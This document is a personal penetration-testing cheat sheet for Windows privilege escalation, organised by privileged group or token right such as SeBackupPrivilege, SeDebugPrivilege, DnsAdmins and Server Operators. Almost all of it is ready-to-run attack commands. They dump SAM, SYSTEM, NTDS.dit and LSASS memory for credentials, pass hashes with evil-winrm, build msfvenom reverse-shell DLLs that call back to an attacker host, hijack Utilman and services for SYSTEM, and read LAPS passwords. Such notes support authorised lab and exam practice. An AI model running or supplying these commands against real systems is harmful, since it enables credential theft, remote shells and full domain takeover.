# Windows privesc: privileged groups and rights

## What I hold
whoami /priv
whoami /groups
- [ ] A privilege shown Disabled is still mine: most tools turn it on themselves
- [ ] In Backup Operators with no SeBackupPrivilege listed: a filtered token, so log in over evil-winrm
- [ ] SeImpersonatePrivilege: :Pb potatoes instead

## SeBackupPrivilege or Backup Operators: the local hashes
reg save HKLM\SAM C:\Users\Public\sam.hive
reg save HKLM\SYSTEM C:\Users\Public\system.hive
- [ ] Both sent back into loot/ with the line serve files ends with
On Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
nxc smb <TargetIP> -u Administrator -H <Hash> --local-auth
evil-winrm -i <TargetIP> -u Administrator -H <Hash>
- [ ] On a domain controller this Administrator is only the DSRM account: NTDS.dit below

## SeBackupPrivilege on a domain controller: NTDS.dit
NTDS.dit is locked while the DC runs, so diskshadow exposes a copy of C: as Z: first. The script, on Kali, with Windows line endings:
cat > shadow.dsh <<'EOF'
set context persistent nowriters
add volume c: alias x
create
expose %x% z:
EOF
unix2dos shadow.dsh
On the target, after fetching shadow.dsh to C:\Users\Public:
cd C:\Users\Public
diskshadow /s shadow.dsh
robocopy /b z:\Windows\NTDS C:\Users\Public ntds.dit
reg save HKLM\SYSTEM C:\Users\Public\system.hive
- [ ] ntds.dit and system.hive sent back into loot/
On Kali:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
evil-winrm -i <DCIP> -u Administrator -H <Hash>

## SeRestorePrivilege
I can write any file. SeRestoreAbuse.exe, from my upload/ folder, points a SYSTEM service at a command and starts it:
cd C:\Users\Public
.\SeRestoreAbuse.exe "C:\Users\Public\rev.exe"
- [ ] rev.exe made with msfvenom -f exe-service, as in :Pb services, since it runs as a service, and a listener up

## SeTakeOwnershipPrivilege
From cmd.exe, Utilman.exe for a SYSTEM prompt at the RDP lock screen:
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant "<Username>:F"
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
- [ ] At the lock screen, the Ease of Access button, or Win+U
- [ ] No RDP: take a SYSTEM service's program instead, :Pb services

## SeDebugPrivilege
LSASS's memory, from PowerShell, which turns the privilege on:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
Or with procdump from Sysinternals:
.\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
- [ ] lsass.dmp sent back into loot/: Defender often deletes it first
On Kali:
pypykatz lsa minidump lsass.dmp

## SeManageVolumePrivilege
SeManageVolumeExploit.exe, from my upload/ folder, gives Users write on the whole of C:
.\SeManageVolumeExploit.exe
icacls C:\Windows\System32\wbem
A DLL that systeminfo loads, made on Kali and fetched to C:\Users\Public:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o tzres.dll
copy C:\Users\Public\tzres.dll C:\Windows\System32\wbem\tzres.dll
systeminfo
- [ ] The shell comes back as NETWORK SERVICE: :Pb potatoes from there

## Server Operators
I may reconfigure services that run as SYSTEM, VSS for one:
sc.exe config VSS binpath= "cmd /c net localgroup administrators <Username> /add"
sc.exe stop VSS
sc.exe start VSS
- [ ] start reports an error and the command still ran: net localgroup administrators
- [ ] A shell instead: an exe-service payload, :Pb services

## DnsAdmins
On Kali, then into the target's upload/ folder:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o dns.dll
On the domain controller, with dns.dll fetched to C:\Users\Public:
dnscmd.exe <Hostname> /config /serverlevelplugindll C:\Users\Public\dns.dll
sc.exe stop dns
sc.exe start dns
- [ ] Access denied on stop: the DLL loads at the next restart of DNS
DNS is down while my DLL is loaded, so afterwards:
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
sc.exe start dns

## LAPS readers
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M laps
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --laps
On the target, legacy LAPS, then Windows LAPS:
Get-ADComputer -Identity <Hostname> -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd
Get-LapsADPassword -Identity <Hostname> -AsPlainText

## Event Log Readers
Command lines in the Security log, where a password was typed:
wevtutil qe Security /rd:true /f:text | Select-String "/user|password"
